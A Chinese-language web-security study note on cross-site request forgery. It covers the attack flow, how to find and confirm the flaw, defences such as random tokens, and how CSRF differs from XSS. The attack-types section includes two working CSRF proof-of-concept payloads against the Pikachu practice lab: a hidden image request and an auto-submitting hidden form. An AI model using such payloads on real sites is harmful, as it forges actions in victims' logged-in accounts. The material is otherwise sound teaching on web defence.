# CSRF

#### 定义:

```
跨站请求伪造（英语：Cross-site request forgery），也被称为 one-click attack 或者 session riding，通常缩写为 CSRF 或者 XSRF， 是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。
```

#### 原理流程

```
1、用户使用自己的浏览器登录网站A
2、在用户没有退出该网站的情况下，用户访问攻击者的危险网站B
3、危险网站B要求访问第三方网站A，发出一个get或者post请求
4、根据危险网站B的请求，该用户的浏览器携带着网站A的cookie向网站A发出请求
5、网站A根据用户的权限处理危险网站B的请求，这样危险网站B达到了模拟该用户操作的目的

在受害用户登录某个正常网站的情况下，攻击者构造了该网站信息修改的页面，隐藏在对应的页面或者连接中，受害用户在点击或者访问该页面的情况下出触发。（服务器没有对用户的信息变更请求进行进行referer校验、token校验、或者使用验证码判断是否是用户本人在操作）
```

#### 触发条件

```
1.登录信任网站A,并在浏览器中保存相应的Cookie,且该cookie未失效。
2. 在网站A给予的cookie没有失效的情况下，用户访问危险网站B。
```

#### 攻击类型

```
get方式                                                                     
	可以使用img这种标签发送对应的http请求
示例:
	<html>
        <body>
        <img src="http://www.pikachu.com/vul/csrf/csrfget/csrf_get_edit.php?sex=boy&phonenum=000000000000&add=nba+lakes&email=kobe%40pikachu.com&submit=submit">
        </body>
    </html>
    <?php
```

```
post方式                                                                   
	可以在burpsuit工具中直接生成csrf表单，然后添加一个自动提交的js事件即可
说明:
	如果服务端已经区分了GET和POST,只用$_POST来接收请求数据。最简单的方法就是在攻击页面构造好一个form表单，然后用javascript自动提交这个表单。

示例:
	<html>
    <!-- CSRF PoC - generated by Burp Suite Professional -->
    <body>
        <script>history.pushState('', '', '/')</script>
            <form action="http://www.pikachu.com/vul/csrf/csrfpost/csrf_post_edit.php" method="POST">
                <input type="hidden" name="sex" value="boy" />
                <input type="hidden" name="phonenum" value="999999999" />
                <input type="hidden" name="add" value="nba&#32;lakes" />
                <input type="hidden" name="email" value="kobe&#64;pikachu&#46;com" />
                <input  type="hidden" name="submit" value="submit" />
                <input  id = "button" type="submit" value="Submit request" />

            </form>
       
        <script>
    //    设置js自动表单提交
        document.getElementById('button').click();
         </body>
    </script>
    </html>
```

#### 如何确认一个web系统存在CSRF漏洞?

```
1.
    对目标网站增删改的地方进行标记，并观察其逻辑，判断请求是否可以被伪造
    ---比如修改管理员账号时，并不需要验证旧密码，导致请求容易被伪造；
    ---比如对于敏感信息的修改并没有使用安全的token验证，导致请求容易被伪造；

2.确认凭证的有效期（这个问题会提高CSRF被利用的概率）
    ---虽然退出或者关闭了浏览器，但cookie仍然有效，或者session并没有及时过期，导致CSRF攻击变
    的简单.
    ---虽然有token令牌验证，但是每次请求的token令牌并没有更改也会导致crsf漏洞
```

#### csrf漏洞挖掘:

```
1、自助建站                                                          
2、能够注册用户信息的网站                              
3、通过抓包查看每次修改之后的信息，是否有token验证，每次修改信息之后提交的数据包中的token验证的信息是否相同
```

#### 防范措施

```
增加token验证（常用的做法）：
1，对关键操作增加token参数，token值必须随机，每次都不一样；
关于安全的会话管理（避免会话被利用）：
1，不要在客户端端保存敏感信息（比如身份认证信息）；
2，测试直接关闭，退出时，的会话过期机制；
3，设置会话过期机制，比如15分钟内无操作，则自动登录超时；
访问控制安全管理：
1，敏感信息的修改时需要对身份进行二次认证，比如修改账号时，需要判断旧密码；
2，敏感信息的修改使用post，而不是get；                                                                                                          
3，通过http 头部中的referer来限制原页面
增加验证码：
一般用在登录（防暴力破解），也可以用在其他重要信息操作的表单中（需要考虑可用性）
```

#### Token是如何防止CSRF的？

```
CSRF的主要问题是敏感操作的链接容易被伪造，那么如何让这个链接不容易被伪造？
每次请求，都增加一个随机码（需要够随机，不容易伪造），后台每次对这个随机码进行验证！
```

#### CSRF与XSS的区别

```
CSRF是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法，攻击者并没有拿到用户的cookie，而XSS是直接盗取到了用户Cookie，然后实施破坏。
```

